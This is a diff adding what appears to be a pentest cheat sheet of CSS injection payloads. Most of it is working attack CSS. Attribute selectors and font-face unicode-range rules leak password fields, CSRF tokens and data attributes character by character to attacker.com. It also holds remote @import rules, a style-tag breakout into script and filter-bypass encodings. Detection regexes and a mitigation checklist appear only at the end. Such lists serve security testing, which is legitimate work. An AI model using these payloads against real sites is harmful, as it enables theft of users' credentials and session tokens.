@@ -1,0 +1,225 @@
+# CSS Injection Payloads
+
+## ========================================
+## BASIC CSS INJECTION
+## ========================================
+
+# Data exfiltration via background
+input[value^="a"] { background: url('http://attacker.com/leak?char=a'); }
+input[value^="b"] { background: url('http://attacker.com/leak?char=b'); }
+
+# Attribute selectors
+input[name="password"][value^="a"] { background: url('http://attacker.com?pwd=a'); }
+
+## ========================================
+## CHARACTER-BY-CHARACTER EXFILTRATION
+## ========================================
+
+# Extract password character by character
+input[name="password"][value^="a"] { background: url('http://attacker.com?c=a'); }
+input[name="password"][value^="b"] { background: url('http://attacker.com?c=b'); }
+input[name="password"][value^="c"] { background: url('http://attacker.com?c=c'); }
+/* ... repeat for all characters */
+
+# Two-character extraction
+input[name="password"][value^="aa"] { background: url('http://attacker.com?c=aa'); }
+input[name="password"][value^="ab"] { background: url('http://attacker.com?c=ab'); }
+
+## ========================================
+## UNICODE-RANGE TRICK
+## ========================================
+
+# Font-face exfiltration
+@font-face {
+  font-family: "leak";
+  src: url('http://attacker.com/leak?char=a');
+  unicode-range: U+0061; /* 'a' */
+}
+
+@font-face {
+  font-family: "leak";
+  src: url('http://attacker.com/leak?char=b');
+  unicode-range: U+0062; /* 'b' */
+}
+
+input { font-family: "leak"; }
+
+## ========================================
+## IMPORTING EXTERNAL CSS
+## ========================================
+
+# @import directive
+@import url('http://attacker.com/steal.css');
+
+# Import with media query
+@import url('http://attacker.com/leak') screen;
+
+## ========================================
+## POLYGLOT INJECTION
+## ========================================
+
+# CSS + HTML injection
+</style><script>alert(1)</script><style>
+
+# CSS + JavaScript
+expression(alert('XSS'))  /* IE only */
+-moz-binding: url('http://attacker.com/xss.xml#xss')
+
+## ========================================
+## EXFILTRATING CSRF TOKENS
+## ========================================
+
+# Extract token by value
+input[name="csrf"][value^="a"] { background: url('http://attacker.com?token=a'); }
+input[name="csrf"][value^="b"] { background: url('http://attacker.com?token=b'); }
+
+## ========================================
+## STEALING TEXT CONTENT
+## ========================================
+
+# Using ::before and ::after
+div[data-secret^="a"]::before {
+  content: "";
+  background: url('http://attacker.com?secret=a');
+}
+
+## ========================================
+## CONDITIONAL CSS INJECTION
+## ========================================
+
+# Media queries for timing
+@media(min-width: 0px) {
+  body { background: url('http://attacker.com/leak?loaded=true'); }
+}
+
+## ========================================
+## ANIMATION-BASED EXFILTRATION
+## ========================================
+
+# Keyframe animation trigger
+@keyframes leak {
+  from { background-image: url('http://attacker.com/start'); }
+  to { background-image: url('http://attacker.com/end'); }
+}
+
+input[value^="a"] {
+  animation: leak 1s;
+}
+
+## ========================================
+## SCROLLBAR LEAK
+## ========================================
+
+# Detect if scrollbar present
+body::-webkit-scrollbar {
+  background: url('http://attacker.com/scrollbar');
+}
+
+## ========================================
+## VISITED LINK DETECTION
+## ========================================
+
+# History sniffing
+a:visited { background: url('http://attacker.com/visited?url=example.com'); }
+
+## ========================================
+## INJECTION POINTS
+## ========================================
+
+# User-controlled CSS
+<style>{{ user_input }}</style>
+
+# Inline style
+<div style="{{ user_css }}"></div>
+
+# Via reflection
+?css=body{background:url('http://attacker.com')}
+
+## ========================================
+## BYPASSING FILTERS
+## ========================================
+
+# Comment tricks
+/* comment */ background: url(...)
+
+# Encoding
+background: \75\72\6C(http://attacker.com)
+background: url(\0068ttp://attacker.com)
+
+# Whitespace
+background:/**/url(http://attacker.com)
+
+## ========================================
+## ADVANCED TECHNIQUES
+## ========================================
+
+# Multiple attribute selectors
+input[type="password"][value^="a"][value$="z"] {
+  background: url('http://attacker.com?first=a&last=z');
+}
+
+# Case-insensitive matching
+input[value^="a" i] { background: url('http://attacker.com?char=a'); }
+
+## ========================================
+## TIMING ATTACKS
+## ========================================
+
+# Slow loading resources
+@import url('http://slow-server.com/delay?char=a');
+
+## ========================================
+## EXPLOITATION EXAMPLES
+## ========================================
+
+# Example 1: Password theft
+<style>
+input[name="password"][value^="a"] { background: url('http://attacker.com/log?pwd=a'); }
+input[name="password"][value^="b"] { background: url('http://attacker.com/log?pwd=b'); }
+/* ... all characters ... */
+</style>
+
+# Example 2: Token exfiltration
+<style>
+@font-face {
+  font-family: "token-leak";
+  src: url('http://attacker.com/token?char=0');
+  unicode-range: U+0030;
+}
+input[name="csrf"] { font-family: "token-leak"; }
+</style>
+
+## ========================================
+## DEFENSIVE DETECTION
+## ========================================
+
+# Check for external URLs
+background.*url\(.*http
+@import.*http
+src:.*url\(.*http
+
+# Check for attribute selectors
+\[value\^=
+\[name=.*\]\[value
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Manual testing
+Browser DevTools
+Network tab monitoring
+
+# CSS Injection scanner
+Custom scripts
+Burp extensions
+
+## ========================================
+## MITIGATION TESTING
+## ========================================
+
+# Check if app:
+- Sanitizes user CSS input
+- Blocks external URLs
+- Uses Content Security Policy
+- Validates CSS properties
